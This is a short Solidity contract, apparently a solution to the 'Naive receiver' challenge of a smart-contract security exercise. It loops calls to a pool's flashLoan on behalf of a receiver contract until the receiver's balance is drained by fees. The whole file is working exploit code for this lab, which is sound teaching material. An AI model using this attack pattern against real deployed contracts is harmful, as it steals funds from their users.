// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0 ;

interface INaiveReceiverLenderPool {
	function flashLoan(address, uint256) external;
}

contract NaiveReceiverHack {
	function takeFlashLoan(address payable pool, address payable naiveReceiver) public {
		while (naiveReceiver.balance > 0){
			// (bool success, ) = pool.call(abi.encodeWithSignature("flashLoan(address,uint256)", naiveReceiver, 0));
			INaiveReceiverLenderPool(pool).flashLoan(naiveReceiver, 0);
		}
	}
}